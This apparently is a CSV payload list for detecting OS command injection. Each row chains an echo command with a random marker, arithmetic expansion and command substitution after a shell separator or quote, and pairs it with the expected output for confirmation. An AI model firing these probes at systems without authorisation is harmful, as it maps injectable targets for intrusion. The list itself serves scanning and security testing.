Payload1,Payload2
echo AGIYMZ$((69+52))$(echo AGIYMZ)AGIYMZ,AGIYMZ+121
 echo TDJHRY$((30+41))$(echo TDJHRY)TDJHRY,TDJHRY+71
;echo MPCSBG$((54+42))$(echo MPCSBG)MPCSBG,MPCSBG+96
&echo NWMZCF$((57+72))$(echo NWMZCF)NWMZCF,NWMZCF+129
|echo TJEGSE$((27+57))$(echo TJEGSE)TJEGSE,TJEGSE+84
||echo ANSBHE$((26+89))$(echo ANSBHE)ANSBHE,ANSBHE+115
&&echo PVJXOS$((12+1))$(echo PVJXOS)PVJXOS,PVJXOS+13
echo VVIEOJ$((30+78))$(echo VVIEOJ)VVIEOJ,VVIEOJ+108
;echo SRPJET$((29+34))$(echo SRPJET)SRPJET,SRPJET+63
&echo NQPWBV$((16+77))$(echo NQPWBV)NQPWBV,NQPWBV+93
&&echo QOZRFB$((19+4))$(echo QOZRFB)QOZRFB,QOZRFB+23
|echo IRODNG$((26+68))$(echo IRODNG)IRODNG,IRODNG+94
||echo KRCSNE$((57+75))$(echo KRCSNE)KRCSNE,KRCSNE+132
echo IFNPXI$((40+99))$(echo IFNPXI)IFNPXI',IFNPXI+139
 echo HBFEEM$((46+2))$(echo HBFEEM)HBFEEM',HBFEEM+48
;echo KHMFRS$((69+67))$(echo KHMFRS)KHMFRS',KHMFRS+136
&echo DACXMN$((57+35))$(echo DACXMN)DACXMN',DACXMN+92
|echo DDLJJW$((33+23))$(echo DDLJJW)DDLJJW',DDLJJW+56
||echo XIYAUA$((17+90))$(echo XIYAUA)XIYAUA',XIYAUA+107
&&echo CMMOTV$((30+10))$(echo CMMOTV)CMMOTV',CMMOTV+40
echo VKWHEH$((83+36))$(echo VKWHEH)VKWHEH',VKWHEH+119
;echo RDKWWC$((22+44))$(echo RDKWWC)RDKWWC',RDKWWC+66
&echo VOANQN$((77+86))$(echo VOANQN)VOANQN',VOANQN+163
&&echo EXUMZL$((4+99))$(echo EXUMZL)EXUMZL',EXUMZL+103
|echo VDZSYZ$((58+1))$(echo VDZSYZ)VDZSYZ',VDZSYZ+59
||echo HYHREQ$((78+11))$(echo HYHREQ)HYHREQ',HYHREQ+89
"echo GHWFXG$((12+72))$(echo GHWFXG)GHWFXG""",GHWFXG+84
" echo BAJXZZ$((73+7))$(echo BAJXZZ)BAJXZZ""",BAJXZZ+80
";echo YRBNTY$((83+14))$(echo YRBNTY)YRBNTY""",YRBNTY+97
"&echo WQLTXV$((0+25))$(echo WQLTXV)WQLTXV""",WQLTXV+25
"|echo PRCGGO$((57+79))$(echo PRCGGO)PRCGGO""",PRCGGO+136
"||echo RWZHCR$((74+28))$(echo RWZHCR)RWZHCR""",RWZHCR+102
"&&echo QTDSQL$((20+35))$(echo QTDSQL)QTDSQL""",QTDSQL+55
